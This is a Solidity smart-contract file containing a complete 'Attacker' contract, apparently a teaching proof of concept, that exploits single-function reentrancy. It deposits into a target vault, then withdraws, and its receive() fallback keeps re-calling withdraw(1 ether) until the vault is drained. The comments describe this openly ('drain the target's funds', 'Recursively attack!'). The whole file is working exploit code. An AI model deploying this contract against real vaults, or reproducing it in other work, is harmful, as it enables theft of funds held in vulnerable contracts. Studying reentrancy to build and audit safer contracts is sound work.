// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * @dev Minimal interface to interact with the target Vault without needing the full source code.
 */
interface IVault {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

/**
 * @title Attacker
 * @dev Malicious contract designed to exploit single-function reentrancy vulnerabilities.
 * Uses the `receive` fallback function to hijack the control flow and drain the target's funds.
 */
contract Attacker {
    IVault public target;

    /**
     * @dev Initializes the attacker contract with the target vault's address.
     * @param _target The address of the vulnerable contract.
     */
    constructor(address _target) {
        target = IVault(_target);
    }

    /**
     * @dev Triggers the reentrancy attack.
     * Deposits initial funds to pass the Vault's require check, then immediately withdraws
     * to initiate the malicious call stack loop.
     * @param amount The initial amount to deposit and use as bait.
     */
    function attack(uint256 amount) external payable {
        // Step 1: Deposit funds to legitimize the attacker's balance in the Vault
        target.deposit{value: amount}();

        // Step 2: Trigger the first withdrawal, starting the inception loop
        target.withdraw(amount);
    }

    /**
     * @dev THE TRAPDOOR: Automatically triggered when the target sends ETH via `.call`.
     * If the target still has funds, it recursively calls `withdraw` before the target
     * can update its internal state.
     */
    receive() external payable {
        // Check if the target still has enough juice to squeeze
        if (address(target).balance >= 1 ether) {
            // Recursively attack!
            target.withdraw(1 ether);
        }
    }
}
